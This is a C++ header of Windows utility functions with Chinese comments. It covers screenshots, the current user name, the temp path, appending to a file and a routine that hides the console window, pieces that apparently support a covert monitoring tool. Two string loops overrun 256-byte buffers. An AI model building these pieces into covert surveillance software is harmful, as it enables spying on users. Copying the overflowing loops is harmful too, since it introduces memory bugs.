#pragma once
#include <iostream>
#include <stdlib.h>
#include <Windows.h>
#include <WinUser.h>
#include <atlimage.h> //屏幕截图使用
#include <tlhelp32.h>
#include <string>
#include <fstream>
using namespace std;

#pragma comment(lib,"Kernel32.lib") 


#define SPLITCHAR  " ## "

//获取当前程序运行路径
string GetCurrentWorkDir(void)
{
	char szFilePath[MAX_PATH + 1] = { 0 };
	GetModuleFileName(NULL,
		szFilePath,
		MAX_PATH);
	(strrchr(szFilePath, '\\'))[0] = 0;
	string path = szFilePath;
	return path;
}

//获取用户临时目录
string GetUserTmpPath()
{
	char tmpPathBuf[MAX_PATH + 1];
	int length = GetTempPath(MAX_PATH, tmpPathBuf);
	if (length != 0)
	{
		cout << "tmpPath: " << tmpPathBuf << endl;
	}
	string tmpPath = tmpPathBuf;
	return tmpPath;
}


//获取当前日期
CString GetDate(void)
{
	SYSTEMTIME sys;//时间对象
	GetLocalTime(&sys);
	CString year1, month1, day1;
	year1.Format("%04d", sys.wYear);
	month1.Format("%02d", sys.wMonth);
	day1.Format("%02d", sys.wDay);
	CString today = year1 + "-" + month1 + "-" + day1;
	return today;
}

//获取当前活动用户名称
string GetCurrentUser(void)
{
	char userName[256] = { 0 };
	DWORD nameLen = 256;
	if (!GetUserName(userName, &nameLen))
	{
		printf("GetUserName Error %d\n", GetLastError());
		return "";
	}
	string finalUserName = string(userName);
	return finalUserName;
}

// 打印屏幕截图
void PrtScn(char   *file_string, HWND hwnd) {

	//获取该窗口的大小
	RECT rect;
	GetClientRect(hwnd, &rect);
	int width = rect.right;
	int heigth = rect.bottom;
	// 获取窗口的设备上下文（Device Contexts）
	HDC hdcWindow = GetDC(hwnd); // 要截图的窗口句柄，为空则全屏


								 // 获取设备相关信息的尺寸大小
	int nBitPerPixel = GetDeviceCaps(hdcWindow, BITSPIXEL);
	CImage image;
	// 创建图像，设置宽高，像素
	image.Create(width, heigth, nBitPerPixel);
	// 对指定的源设备环境区域中的像素进行位块（bit_block）转换
	BitBlt(
		image.GetDC(),  // 保存到的目标 图片对象 上下文
		0, 0,     // 起始 x, y 坐标
		width, heigth,  // 截图宽高
		hdcWindow,      // 截取对象的 上下文句柄
		0, 0,           // 指定源矩形区域左上角的 X, y 逻辑坐标
		SRCCOPY);


	image.Save(file_string);

	// 释放 DC句柄
	ReleaseDC(hwnd, hdcWindow);
	// 释放图片上下文
	image.ReleaseDC();
	// 将图片保存到 file_string
	//image.ReleaseGDIPlus();
	image.Destroy();
}

// 写入文件内容
void Write(string testFileName, string ch)
{
	ofstream f1;
	f1.open(testFileName, ios::app);
	f1 << ch;
	f1.close();
	Sleep(5); // 延时5ms
}

// 隐藏窗口
void Hide()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_HIDE);
}

// 赋值字符串
void GiveChar(char a[256], char b[256])
{
	for (int i = 0; i <= 256; i++)
		a[i] = b[i];
}

// 检查字符串 不同返回0 相同返回1
bool CheckChar(char a[256], char b[256])
{
	for (int i = 0; i <= 256; i++)
	{
		if (a[i] != b[i])
		{
			return 0;
		}
	}
	return 1;
}

// 获取系统时间
void GetSystemTime()
{
	SYSTEMTIME sys;
	GetLocalTime(&sys);
	cout << sys.wYear << "/" << sys.wMonth << "/" << sys.wDay << " " << sys.wHour << ":" << sys.wMinute << ": " << sys.wMinute << " ";
}


// char转wide char
wchar_t* c2w(const char *str)
{
	int length = strlen(str) + 1;
	wchar_t *t = (wchar_t*)malloc(sizeof(wchar_t)*length);
	memset(t, 0, length * sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, str, strlen(str), t, length);
	return t;
}


